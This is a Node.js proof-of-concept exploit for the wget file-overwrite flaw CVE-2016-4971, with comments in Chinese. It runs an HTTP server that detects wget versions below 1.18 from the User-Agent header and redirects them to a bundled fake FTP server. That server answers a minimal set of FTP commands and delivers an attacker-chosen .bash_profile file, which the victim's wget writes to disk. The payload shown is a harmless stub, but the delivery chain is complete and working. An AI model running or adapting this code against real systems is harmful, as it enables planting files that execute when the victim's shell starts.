var net = require('net');
var server = net.createServer();
var ftp = net.createServer();
var host ='Server IP Address';
var bash_profile ='#!/bin/sh\n#wget vulnerable\n';

// FTP服务器监听在21端口
ftp.listen(21, host);

// HTTP服务器监听本机的80端口
server.listen(80, host);

// 有HTTP用户连接时
server.on('connection', function(socket) {
    console.log('HTTP connected from: ' + socket.remoteAddress + ':' + socket.remotePort);

    socket.on('data', function(data) {
        // 分离头部(当然, 我们假设这是HTTP包)
        var header = data.toString().split('\r\n');
        // 判断是否是wget所发送的请求
        var wget_regex = new RegExp(/^User-Agent: Wget\/([\d\.]+)?(.*)/);
        for (var i = 0; i < header.length; i++) {
            var matches = header[i].match(wget_regex);
            if (matches != null) {
                // 判断wget版本号, 低于1.18的版本可以利用此漏洞CVE-2016-4971
                var version = parseFloat(matches[1]);
                console.log('wget version: ' + matches[1] + ' ' +(version < 1.18 ? 'vulnerable' : 'invulnerable'));
                if (version < 1.18) {
                    // 重定向到ftp服务器
                    socket.write('HTTP/1.1 302 Found\r\nContent-Type: text/html; charset=UTF-8\r\nLocation: ftp://' + host + '/.bash_profile\r\nContent-Length: ' + bash_profile.length + '\r\n\r\n');
                }
                // 关闭HTTP的socket连接
                socket.destroy();
            }
        }
    });
});

// 有FTP用户连接时
ftp.on('connection', function(socket) {
    console.log('FTP connected from: ' + socket.remoteAddress + ':' + socket.remotePort);

    // FTP返回状态码和消息
    socket.reply = function (status, message, callback) {
        if (!message) message = messages[status.toString()] || 'No information';
        if (this.writable) {
            this.write(status.toString() + ' ' + message.toString() + '\r\n', callback);
        }
    };

    // FTP数据链路的Handler
    socket.dataTransfer = function (handle) {
        console.log('Remote begins downloading...');
        function finish(dataSocket) {
            return function (err) {
                if (err) {
                    dataSocket.emit('error', err);
                } else {
                    dataSocket.end();
                }
            }
        }

        // 开始数据传输
        function execute() {
            socket.reply(150);
            handle.call(socket, this, finish(this));
        }

        // 将准备好的放入队列
        socket.dataTransfer.queue.push(execute)
    }
    socket.dataTransfer.queue = []

    // 当有新的FTP连接时
    // 自动回复200
    socket.reply(200);

    // 处理FTP命令
    socket.on('data', function(data) {
        var parts = data.toString().trim().split(" ");
        var command = parts[0].trim().toUpperCase(), args = parts.slice(1, parts.length);
        var callable = commands[command];
        if (callable) {
            callable.apply(socket, args);
        } else {
            socket.reply(502);
        }
    });
});

// 一个不完整的FTP状态码-消息表
messages = {
    "150" : "File status okay; about to open data connection.",
    "200" : "Command okay.",
    "215" : "NodeFTP server emulator.",
    "230" : "User logged in, proceed.",
    "331" : "User name okay, need password.",
    "502" : "Command not implemented.",
};

// 一个不完整的FTP命令表
commands = {
    // 用户名
    "USER" : function () {
        this.reply(331);
    },
    // 密码
    "PASS": function (password) {
        this.reply(230);
    },
    // FTP系统类型
    "SYST" : function () {
        this.reply(215);
    },
    // 当前工作目录
    "PWD" : function () {
        this.reply(257, '"/"');
    },
    // 传输的数据类型
    "TYPE" : function (dataEncoding) {
        if (dataEncoding == "A" || dataEncoding == "I") {
            this.dataEncoding = (dataEncoding == "A") ? 'utf8' : "binary";
            this.reply(200);
        } else {
            this.reply(501);
        }
    },
    // 被动模式
    "PASV" : function () {
        var socket = this, dataServer = net.createServer();
        dataServer.on('connection', function (dataSocket) {
            dataSocket.setEncoding(socket.dataEncoding);
            if (socket.dataTransfer.queue.length) {
                socket.dataTransfer.queue.shift().call(dataSocket);
            } else {
                dataSocket.emit('error', {"code": 421});
                socket.end();
            }
            dataSocket.on('close', function () {
                socket.reply(this.error ? 426 : 226);
                dataServer.close();
            }).on('error', function (err) {
                this.error = err;
                socket.reply(err.code || 500, err.message);
            })
        }).on('listening', function () {
            var port = this.address().port, host = server.address().address;
            socket.dataInfo = { "host": host, "port": port };
            socket.reply(227, 'PASV OK (' + host.split('.').join(',') + ',' + parseInt(port/256,10) + ',' + (port%256) + ')');
        }).listen()
    },
    // 取文件
    "RETR" : function (file) {
        var socket = this;
        console.log('Remote begins downloading...');
        socket.dataTransfer(function (dataSocket, finish) {
            dataSocket.write(bash_profile, socket.dataEncoding);
            dataSocket.end();
            console.log('Remote ' + socket.remoteAddress + ':' + socket.remotePort + ' has retrived .bash_profile.');
        });
    },
};
